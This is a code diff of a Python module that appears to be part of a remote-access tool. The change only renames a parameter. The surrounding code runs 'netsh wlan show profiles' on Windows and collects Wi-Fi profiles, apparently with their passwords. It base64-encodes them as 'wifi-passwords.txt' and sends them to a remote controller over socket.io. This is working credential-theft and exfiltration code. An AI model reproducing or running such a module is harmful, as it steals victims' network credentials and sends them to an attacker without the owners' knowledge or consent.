@@ -3,7 +3,7 @@ import subprocess
 import re
 import base64
 
-def run(sio, uuid):
+def run(sio, uid):
     if os.name == "nt":
 
         command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
@@ -35,4 +35,4 @@ def run(sio, uuid):
         for x in range(len(wifi_list)):
             print(wifi_list[x])
 
-        sio.emit('download_file_return', {'uuid': uuid, 'file_name': "wifi-passwords.txt", 'file': base64.b64encode(str(wifi_list).encode('utf-8'))})
+        sio.emit('download_file_return', {'uid': uid, 'file_name': "wifi-passwords.txt", 'file': base64.b64encode(str(wifi_list).encode('utf-8'))})
